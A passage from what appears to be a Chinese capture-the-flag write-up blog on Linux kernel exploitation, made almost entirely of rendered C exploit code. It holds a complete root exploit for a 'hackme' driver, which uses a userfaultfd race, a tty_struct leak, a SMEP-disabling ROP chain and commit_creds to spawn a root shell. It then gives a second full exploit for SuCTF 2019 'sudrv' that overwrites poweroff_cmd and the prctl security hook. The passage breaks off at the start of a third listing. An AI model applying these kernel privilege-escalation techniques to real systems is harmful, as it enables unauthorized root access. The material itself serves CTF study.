class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>* <span class="title">user_chunk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uwrite</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size,<span class="keyword">long</span> <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    user_chunk-&gt;offset = offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> get_shell_addr = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">su</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"push user_ss;"</span></span><br><span class="line">        <span class="string">"push user_rsp;"</span></span><br><span class="line">        <span class="string">"push user_rflags;"</span></span><br><span class="line">        <span class="string">"push user_cs;"</span></span><br><span class="line">        <span class="string">"push get_shell_addr;"</span></span><br><span class="line">        <span class="string">"swapgs;"</span></span><br><span class="line">        <span class="string">"iretq;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(<span class="keyword">void</span>* uffd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">mypollfd</span>;</span></span><br><span class="line"></span><br><span class="line">    mypollfd.fd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)uffd;</span><br><span class="line">    mypollfd.events = POLLIN;</span><br><span class="line">    <span class="keyword">int</span> re = poll(&amp;mypollfd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(re &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Catch error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Struck the pagefault!!!"</span>);</span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_uffd</span><span class="params">(<span class="keyword">uint64_t</span> fault_page,<span class="keyword">uint64_t</span> fault_page_size)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">myapi</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">myuffd</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> pt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uffd = syscall(__NR_userfaultfd,O_CLOEXEC|O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    myapi.api = UFFD_API;</span><br><span class="line">    myapi.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;myapi) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Api error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myuffd.range.start = fault_page;</span><br><span class="line">    myuffd.range.len = fault_page_size;</span><br><span class="line">    myuffd.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Register error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> re = pthread_create(&amp;pt,<span class="literal">NULL</span>,handle,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Create pthread error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/hackme"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:(]Open error...\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_chunk = (struct chunk*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct chunk));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x200000</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0</span>,buf,<span class="number">0x200000</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd,<span class="number">0</span>,buf,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span>* mmap_addr = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> fault_page = mmap_addr; </span><br><span class="line">        <span class="keyword">uint64_t</span> fault_page_size = <span class="number">0x1000</span>;</span><br><span class="line">        register_uffd(fault_page,fault_page_size);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">new</span>(fd,<span class="number">0</span>,mmap_addr,<span class="number">0x400</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ptmx_fd = open(<span class="string">"/dev/ptmx"</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(ptmx_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]OPen ptmx error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uread(fd,<span class="number">0</span>,buf,<span class="number">0x200000</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">size_t</span> *search_ptr = (<span class="keyword">size_t</span>*)buf;</span><br><span class="line">        <span class="keyword">size_t</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>* temp = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x200000</span>/<span class="number">8</span>;i += <span class="number">0x200</span>/<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">0x200</span>/<span class="number">8</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(search_ptr[i+j] == <span class="number">0x100005401</span>)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">"[:)]Find tty_struct!!!"</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"[:)]offset = %p\n"</span>,(i+j)*<span class="number">8</span>);</span><br><span class="line">                    offset = (i+j)*<span class="number">8</span>;</span><br><span class="line">                    <span class="built_in">memcpy</span>(temp,search_ptr+i+j,<span class="number">0x200</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(offset != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">size_t</span> kernel_base = search_ptr[offset/<span class="number">8</span> + <span class="number">3</span>]<span class="number">-0x625d80</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line">	    prepare_kernel_cred = <span class="number">0x4d3d0</span> + kernel_base;</span><br><span class="line">	    commit_creds = <span class="number">0x4d220</span> + kernel_base;</span><br><span class="line">        <span class="keyword">size_t</span> heap_base = search_ptr[offset/<span class="number">8</span> + <span class="number">7</span>]<span class="number">-0xe15b438</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:)]heap_base = %p\n"</span>,heap_base);</span><br><span class="line"></span><br><span class="line">        search_ptr[<span class="number">2</span>] = kernel_base + <span class="number">0x1b5a1</span>; <span class="comment">//pop rax; ret;</span></span><br><span class="line">        search_ptr[<span class="number">3</span>] = <span class="number">0x6f0</span>;</span><br><span class="line">        search_ptr[<span class="number">4</span>] = kernel_base + <span class="number">0x252b</span>; <span class="comment">//mov cr4, rax; push rcx; popfq; pop rbp; ret; </span></span><br><span class="line">        search_ptr[<span class="number">5</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        search_ptr[<span class="number">6</span>] = (<span class="keyword">size_t</span>)su;</span><br><span class="line">        </span><br><span class="line">        search_ptr[<span class="number">16</span>] = kernel_base + <span class="number">0x484f0</span>; <span class="comment">//pop rsp;ret;</span></span><br><span class="line">        search_ptr[<span class="number">17</span>] = heap_base + <span class="number">0xe15b010</span>;</span><br><span class="line">        search_ptr[<span class="number">23</span>] = kernel_base + <span class="number">0x200f66</span>; <span class="comment">//mov rsp,rax;.........;</span></span><br><span class="line">        search_ptr[offset/<span class="number">8</span> + <span class="number">3</span>] = heap_base + <span class="number">0xe15b080</span>;</span><br><span class="line">        uwrite(fd,<span class="number">0</span>,buf,<span class="number">0x420</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        memset(buf,'\x00',8);</span><br><span class="line">        write(ptmx_fd,buf,<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/14/IhpsxUXoEYHncMg.png" alt=""></p>
<h1 id="2019SuCTF-sudrv"><a href="#2019SuCTF-sudrv" class="headerlink" title="2019SuCTF_sudrv"></a>2019SuCTF_sudrv</h1><h2 id="解法一：-3"><a href="#解法一：-3" class="headerlink" title="解法一："></a>解法一：</h2><p>改<code>task_prctl.hook</code>和<code>poweroff_cmd</code>，难点在于这两个变量的寻找。</p>
<p><code>poweroff_cmd</code>可在<code>ida</code>中寻找字符串，或是在<code>gdb</code>中用<code>find</code>寻找。</p>
<p><code>hook</code>需要我们动态调试，需要注意的是，不同版本的内核情况有很大差异，可能找到它需要花一些功夫和猜测。</p>
<p>最终的<code>exp</code>也不是很稳定。。。有时会失败，有事会崩溃，和内核堆的内存有关应该。</p>
<h2 id="exp：-15"><a href="#exp：-15" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0xDEADBEEF</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x73311337</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x13377331</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/meizijiutql"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x10000</span>);</span><br><span class="line">    memset(buf,'\x00',0x10000);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">"%lx%lx%lx%lx%lx%lx %lx%lx%lx%lx %lx%lx "</span>);</span><br><span class="line">    write(fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    uread(fd);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"dmesg | grep deadbeef &gt; leak.txt"</span>);</span><br><span class="line">    FILE* leak_fd = fopen(<span class="string">"leak.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(leak_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Oh..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(buf,<span class="number">0x100</span>,leak_fd);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> kernel_base = strtoull(buf+<span class="number">27</span>,<span class="literal">NULL</span>,<span class="number">16</span>) - <span class="number">0x1c827f</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_base = strtoull(buf+<span class="number">27</span>+<span class="number">1</span>+<span class="number">17</span>+<span class="number">0x10</span>+<span class="number">0x10</span>,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]stack_base = %p\n"</span>,stack_base);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> poweroff_cmd = kernel_base + <span class="number">0x1241d40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]poweroff_cmd = %p\n"</span>,poweroff_cmd);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> security_task_prctl = kernel_base + <span class="number">0x3134e0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hook_addr = kernel_base + <span class="number">0x12934a8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]hook_addr = %p\n"</span>,hook_addr);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> poweroff_work_func = kernel_base + <span class="number">0x82000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/meizijiutql"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Oh..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0xc0</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span>*)(buf+<span class="number">0xc0</span>) = poweroff_cmd;</span><br><span class="line">    write(fd,buf,<span class="number">0xc8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0xc0</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0xc0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">"/bin/chmod 777 /flag"</span>);</span><br><span class="line">    write(fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span>*)(buf+<span class="number">0x100</span>) = hook_addr;</span><br><span class="line">    write(fd,buf,<span class="number">0x108</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_table[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_table[<span class="number">3</span>] = poweroff_work_func;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = &amp;fake_table;</span><br><span class="line">    write(fd,&amp;p,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    prctl(poweroff_cmd,<span class="number">2</span>,poweroff_cmd,poweroff_cmd,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/15/NHD8C4Jvx6UakPd.png" alt="x2.PNG"></p>
<h2 id="解法二：-3"><a href="#解法二：-3" class="headerlink" title="解法二："></a>解法二：</h2><p>劫持栈，<code>ROP</code></p>
<p>溢出修改<code>fd</code>，向栈申请chunk。</p>
<h2 id="exp：-16"><a href="#exp：-16" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 